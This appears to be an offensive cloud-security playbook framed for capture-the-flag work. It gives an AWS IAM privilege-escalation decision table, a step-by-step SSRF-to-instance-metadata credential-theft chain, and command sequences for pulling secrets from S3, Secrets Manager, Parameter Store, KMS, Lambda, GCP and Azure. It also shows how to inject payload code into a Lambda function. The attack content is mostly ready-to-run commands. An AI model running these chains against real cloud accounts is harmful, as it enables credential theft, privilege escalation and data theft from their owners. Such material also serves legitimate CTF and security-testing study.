# Cloud IAM Escalation and SSRF Pivot Patterns

Load when you have an initial cloud identity (key, role, VM shell, or SSRF) and need to escalate privileges or chain to the objective.

---

## AWS IAM privilege escalation — decision tree

```
Start: aws sts get-caller-identity → know your ARN and account ID

Low-privilege identity?
├── Run enumerate-iam.py → map ALL allowed actions
├── Focus on any iam:* → see categories below
├── Focus on compute actions → PassRole chains
└── Focus on data actions → S3, Secrets, KMS

Action categories and their escalation potential:
```

| IAM action | Escalation vector |
|---|---|
| `iam:CreatePolicyVersion` + existing policy | Inject admin permissions into an existing policy |
| `iam:AttachUserPolicy` / `iam:AttachRolePolicy` | Attach `AdministratorAccess` to self |
| `iam:PutUserPolicy` / `iam:PutRolePolicy` | Inline admin policy on self |
| `iam:UpdateAssumeRolePolicy` | Modify a role's trust to allow self to assume it |
| `iam:CreateAccessKey` on another user | Generate credentials for a higher-privileged user |
| `iam:PassRole` + `lambda:UpdateFunctionCode` | Inject code into Lambda running under a privileged role |
| `iam:PassRole` + `ec2:RunInstances` | Launch EC2 with a privileged instance profile → IMDS |
| `sts:AssumeRole` directly | If a role trusts your identity in its trust policy |

---

## SSRF → IMDS credential chain

This is the most common cloud CTF initial-access pattern.

```bash
# Step 1: confirm SSRF to internal metadata (IMDSv1 — direct GET)
curl http://<target>/proxy?url=http://169.254.169.254/latest/meta-data/

# IMDSv2 — requires token first (PUT → GET)
# Step 2a: get token (must go through the SSRF)
PUT http://169.254.169.254/latest/api/token
Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
# → token returned

# Step 2b: use token to query metadata
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
Header: X-aws-ec2-metadata-token: <token>
# → role name returned

# Step 3: get credentials for the role
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
# → AccessKeyId, SecretAccessKey, Token, Expiration

# Step 4: export and use
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity
```

For Spring Boot Actuator + SSRF chains:
- `/actuator/env` → leak internal endpoints
- `/actuator/mappings` → discover proxy paths

---

## S3 bucket pivots

```bash
# List bucket (anonymous access check)
aws s3 ls s3://<bucket-name> --no-sign-request

# List with credentials
aws s3 ls s3://<bucket-name>
aws s3 cp s3://<bucket-name>/flag.txt .

# Object versions (common CTF trick — flag in a deleted version)
aws s3api list-object-versions --bucket <bucket-name>
aws s3api get-object --bucket <bucket-name> --key <key> --version-id <version-id> flag.txt

# Public bucket via HTTP (guessable name)
curl https://<bucket-name>.s3.amazonaws.com/
curl https://<bucket-name>.s3.amazonaws.com/<key>
```

---

## Secrets Manager and Parameter Store

```bash
# Enumerate secrets
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id <id>

# Parameter Store
aws ssm describe-parameters
aws ssm get-parameter --name <name> --with-decryption

# KMS — check what you can decrypt
aws kms list-keys
aws kms decrypt --ciphertext-blob fileb://encrypted.bin --query Plaintext --output text | base64 -d
```

---

## Lambda pivots

```bash
# List functions
aws lambda list-functions

# Read source code (environment variables often contain keys/flags)
aws lambda get-function --function-name <name>
aws lambda get-function-configuration --function-name <name>

# If UpdateFunctionCode is allowed (privilege escalation)
# Upload a handler that prints env or reads Secrets Manager and call it
aws lambda update-function-code --function-name <name> --zip-file fileb://payload.zip
aws lambda invoke --function-name <name> out.json; cat out.json
```

---

## GCP service account pivots

```bash
gcloud auth activate-service-account --key-file=serviceaccount.json
gcloud config set project <project-id>

# Enumerate permissions
gcloud projects get-iam-policy <project-id>
gcloud iam service-accounts list

# Storage (GCS)
gsutil ls gs://<bucket>
gsutil cp gs://<bucket>/flag.txt .

# Secrets
gcloud secrets list
gcloud secrets versions access latest --secret=<secret-name>

# Cloud Functions
gcloud functions list
gcloud functions describe <name>
```

---

## Azure pivots

```bash
az account show
az role assignment list --assignee $(az account show --query id -o tsv) --all

# Storage
az storage account list
az storage blob list --account-name <name> --container-name <container>
az storage blob download --account-name <name> --container-name <container> --name flag.txt -f flag.txt

# Key Vault
az keyvault list
az keyvault secret list --vault-name <vault>
az keyvault secret show --vault-name <vault> --name <secret>

# SAS token access (no credentials needed)
curl "https://<account>.blob.core.windows.net/<container>/flag.txt?<SAS-token>"
```

---

## Unique ID resolution (AWS)

When given a bare unique ID like `AROAXYAFLIG2BLQFIIP34`:

| Prefix | Principal type |
|---|---|
| `AIDA` | IAM User |
| `AROA` | IAM Role |
| `ASIA` | Temporary session (STS) |
| `AKIA` | Long-term Access Key |
| `AGPA` | Group |
| `AIPA` | Instance Profile |

Resolution: create a free AWS account → IAM → Create Role → Custom trust policy with the unique ID as `Principal` → save → open Trust relationships tab → AWS resolves it to the full ARN.

---

## Common pitfalls

- Not checking object versions (flag deleted but version retained).
- Using IMDS queries directly instead of through the SSRF path.
- Forgetting `--with-decryption` on SSM parameter reads.
- Assuming `list-*` allowed means `get-*` allowed — always test both.
- Overlooking env vars in Lambda configurations as a flag vector.
